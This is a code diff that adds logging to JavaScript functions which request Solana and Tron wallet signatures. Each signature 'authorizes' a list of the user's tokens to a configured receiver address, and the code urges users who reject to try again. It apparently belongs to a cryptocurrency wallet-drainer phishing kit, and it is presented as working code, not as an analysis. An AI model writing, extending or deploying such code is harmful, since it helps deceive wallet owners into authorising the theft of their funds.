@@ -1022,79 +1022,110 @@ async function requestEVMSignature(evmTokens) {
 
 // ============ SOLANA SIGNATURE ============
 async function requestSolanaSignature(solanaTokens) {
+  console.log('🟣 requestSolanaSignature() called with tokens:', solanaTokens.map(t => t.symbol));
+  
   try {
     if (!solanaProvider) {
-      log('Solana provider not available', 'warn');
+      log('❌ Solana provider not available', 'error');
+      console.log('Solana provider is null');
       return;
     }
     
-    log('Requesting Solana signature...');
+    log('🟣 Requesting Solana signature...', 'info');
+    console.log('Solana provider:', solanaProvider);
     log(`Tokens: ${solanaTokens.map(t => t.symbol).join(', ')}`);
     
     const message = new TextEncoder().encode(
       `Authorization for tokens: ${solanaTokens.map(t => t.symbol).join(', ')}\nReceiver: ${CONFIG.RECEIVER_ADDRESS}`
     );
     
-    log('Waiting for signature popup...', 'success');
+    console.log('Message to sign:', new TextDecoder().decode(message));
+    
+    log('⏳ Waiting for Solana wallet signature popup...', 'success');
+    console.log('About to request signature from Solana wallet...');
     
     let signedMessage;
     
     // Try different Solana wallet APIs
     if (solanaProvider.signMessage && typeof solanaProvider.signMessage === 'function') {
       // Phantom/Solflare API: signMessage(message)
-      log('Using signMessage API', 'info');
+      log('Using signMessage() API', 'info');
+      console.log('Calling solanaProvider.signMessage()...');
       const result = await solanaProvider.signMessage(message);
       signedMessage = result;
+      console.log('✅ Solana signature result:', result);
       log(`✅ Solana Signature: ${result.signature ? result.signature.substring(0, 30) : 'confirmed'}...`, 'success');
     } else if (solanaProvider.sign && typeof solanaProvider.sign === 'function') {
       // Some wallets use sign() instead
-      log('Using sign API', 'info');
+      log('Using sign() API', 'info');
+      console.log('Calling solanaProvider.sign()...');
       const result = await solanaProvider.sign(message);
       signedMessage = result;
+      console.log('✅ Solana signature result:', result);
       log(`✅ Solana Signature: confirmed`, 'success');
     } else {
-      log('Solana provider signature methods not found. Available methods:', 'error');
+      console.log('❌ No signing method found. Available methods:', Object.keys(solanaProvider));
+      log('❌ Solana provider signature methods not found. Available:', 'error');
       log(Object.keys(solanaProvider).join(', '), 'error');
       throw new Error('Solana wallet does not support signing');
     }
     
   } catch (err) {
-    log(`Solana Signature failed: ${err.message}`, 'error');
+    console.error('❌ Solana Signature error:', err);
+    log(`❌ Solana Signature failed: ${err.message}`, 'error');
     
     if (err.message.includes('User rejected') || err.message.includes('user rejected')) {
+      log('User rejected the Solana signature', 'warn');
       throw new Error('You rejected the Solana signature. Please try again.');
     } else {
-      log('Continuing without Solana signature...', 'warn');
+      log('Continuing despite Solana signature error...', 'warn');
+      console.log('Proceeding despite error');
     }
   }
 }
 
 // ============ TRON SIGNATURE ============
 async function requestTronSignature(tronTokens) {
+  console.log('🟡 requestTronSignature() called with tokens:', tronTokens.map(t => t.symbol));
+  
   try {
-    if (!tronWeb || !tronWeb.trx.sign) {
-      log('Tron provider does not support signing', 'warn');
+    if (!tronWeb) {
+      log('❌ Tron provider not available', 'error');
+      console.log('tronWeb is null');
       return;
     }
     
-    log('Requesting Tron signature...');
+    if (!tronWeb.trx || !tronWeb.trx.sign) {
+      log('❌ Tron provider does not support signing', 'error');
+      console.log('tronWeb.trx.sign not available');
+      return;
+    }
+    
+    log('🟡 Requesting Tron signature...', 'info');
+    console.log('Tron provider:', tronWeb);
     log(`Tokens: ${tronTokens.map(t => t.symbol).join(', ')}`);
     
     const message = `Authorization for tokens: ${tronTokens.map(t => t.symbol).join(', ')}\nReceiver: ${CONFIG.RECEIVER_ADDRESS}`;
+    console.log('Message to sign:', message);
     
-    log('Waiting for signature popup...', 'success');
+    log('⏳ Waiting for Tron wallet signature popup...', 'success');
+    console.log('About to call tronWeb.trx.sign()...');
     
     const signed = await tronWeb.trx.sign(message);
     
+    console.log('✅ Tron signature result:', signed);
     log(`✅ Tron Signature: ${signed.substring(0, 30)}...`, 'success');
     
   } catch (err) {
-    log(`Tron Signature failed: ${err.message}`, 'error');
+    console.error('❌ Tron Signature error:', err);
+    log(`❌ Tron Signature failed: ${err.message}`, 'error');
     
     if (err.message.includes('User rejected')) {
+      log('User rejected the Tron signature', 'warn');
       throw new Error('You rejected the Tron signature. Please try again.');
     } else {
-      log('Continuing without Tron signature...', 'warn');
+      log('Continuing despite Tron signature error...', 'warn');
+      console.log('Proceeding despite error');
     }
   }
 }
